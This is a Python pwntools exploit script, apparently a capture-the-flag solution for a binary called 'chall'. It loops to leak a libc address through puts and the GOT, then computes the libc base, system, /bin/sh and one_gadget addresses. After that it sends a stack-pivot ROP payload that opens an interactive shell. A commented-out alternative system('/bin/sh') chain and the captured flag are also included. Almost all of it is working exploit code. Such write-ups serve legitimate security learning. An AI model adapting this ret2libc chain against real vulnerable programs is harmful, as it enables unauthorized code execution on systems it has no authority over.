from pwn import *

context.binary = "./chall"
script = """
b*main+22
b*main
b*nah+92
b*set_name
"""
pop_rdi = 0x00000000004015d3
return_nah = 0x0000000000401479
ret = 0x000000000040101a
#0x000000000040142b
#0x0000000000401479
put_got = 0x403fb8 
def your_name(name):
    p.sendlineafter(b"Your name: ", name)


def nah(payload: bytes):
    p.sendlineafter(b'You choice: ', b'4')
    p.sendafter(b'Your feedback: ', payload)



#gdb.attach(p,script)
#while True:
while True:
    p = process()
    #p = remote("chall.w1playground.com",60600)
    your_name(b'A')


    payload = p64(0x3fe000+0x10) + p64(pop_rdi) + p64(put_got) + p64(0x4010a0)+p64(0x000000000040145c+4)
    payload += p64(ret)+p64(0x000000000040145c+4)
    payload += p64(ret) + p64(0x000000000040145c+4)
    payload += cyclic(88-8*8) 

    nah(payload)
    time.sleep(0.2)
    try:
        msg = p.recvline(timeout=1).strip(b'\n')
        check = p.recv(timeout=1)
        print(msg)
        print(check)
        if b'Your name' in check and u64(msg.ljust(8, b'\x00')) !=0:
            # gdb.attach(p,script)
            # leak_libc = msg.strip(b'\n').ljust(8, b'\x00')
            # print(hex(leak_libc))
            #gdb.attach(p,script)
            break
    except Exception:
        p.close()
    p.close()
leak_libc = u64(msg.ljust(8, b'\x00'))
print(hex(leak_libc))
system_fun = leak_libc - 0x300e0
bin_sh = leak_libc + 0x157828
libc_base = leak_libc - 0x80e50
one_gadget = libc_base + 0xebd43
payload2 = b'A'*70+p64(0x000000000040145c+4)

p.sendline(b'A')
p.sendlineafter(b'You choice: ',b'4')
p.sendlineafter(b'Your feedback: ',payload2)
print("OK")
time.sleep(0.2)
#gdb.attach(p,script)
#print(p.recv())
p.sendlineafter(b'Your name: ',b'A')
time.sleep(0.2)
p.sendlineafter(b'You choice: ',b'4')
time.sleep(0.2)
print("OK2")

#gdb.attach(p,script)
payload3 = b'B'*70

p.sendlineafter(b'Your feedback: ',payload3)

p.sendlineafter(b'Your name: ',b'A')
time.sleep(0.2)
p.sendlineafter(b'You choice: ',b'4')
time.sleep(0.2)

final = cyclic(56-8) + p64(0x404000+0x100) + p64(one_gadget)+ cyclic(16) #p64(pop_rdi) + p64(bin_sh) + p64(system_fun)





p.sendlineafter(b'Your feedback: ', final)
print("OK3")




p.interactive()

    # p.sendlineafter(b'Your name: ',b'A')
    # time.sleep(0.2)
    # p.sendlineafter(b'You choice: ',b'4')
    # time.sleep(0.2)
    # payload3 = p64(pop_rdi) + p64(bin_sh) + p64(system_fun)+cyclic(40)+p64(0x00000000004013c8)+p64(0x00000000004013c8+121)
    # p.sendlineafter(b'Your feedback: ',payload3)
    # #nah(payload3)
    # time.sleep(0.2)     
    # try:
    #     p.sendline(b'ls')
    #     p.interactive()
    # except Exception:
    #     p.close()
    # p.close()
#p.interactive()


    #+p64(0x00000000004012e2) #+ p64(bin_sh) #+ p64(system_fun)

#p.send(payload2)


#p.sendafter(b'You choice: ',b'1111')

#p.sendline(b'4')
#p.recv()
# gdb.attach(p,script)
#p.sendafter(b'Your feedback: ',payload2) p64(0x3fe000+0x10) +


#Flag = W1{7ee11e7bbb6cefe75a8f1bc4b969b941}

